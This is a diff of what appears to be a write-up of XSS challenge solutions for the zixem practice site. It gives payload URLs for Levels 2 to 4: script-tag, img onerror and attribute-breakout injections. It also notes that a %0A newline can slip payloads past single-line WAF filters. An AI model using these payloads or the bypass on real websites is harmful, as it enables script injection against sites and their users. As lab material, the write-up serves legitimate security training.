@@ -3,6 +3,6 @@ Level 2: [http://www.zixem.altervista.org/XSS/2.php?name=<scrIpt>alert(1337)</sc
 Level 3: [https://zixem.altervista.org/XSS/3.php?name=zxm%0A`<img src=”x” onerror=alert(1337)>`](https://zixem.altervista.org/XSS/3.php?name=zxm%0A%3Cimg%20src=%E2%80%9Dx%E2%80%9D%20onerror=alert(1337)%3E) \
   Using %0A URL-encoded representation of a newline character (Line Feed, LF, \n) in ASCII and UTF-8 encoding. \
   Some WAFs only scan for dangerous keywords within a single line. If an attack payload is split across multiple lines \
-  (e.g., using %0A for a newline), the filter may fail to detect it, allowing bypass techniques for XSS, SQLi, and other attacks.
-Level 4: 
+  (e.g., using %0A for a newline), the filter may fail to detect it, allowing bypass techniques for XSS, SQLi, and other attacks. \
+Level 4: [http://zixem.altervista.org/XSS/4.php?img=htp.pngd'onerror=alert(1337)%20](http://zixem.altervista.org/XSS/4.php?img=htp.pngd'onerror=alert(1337)%20)
 
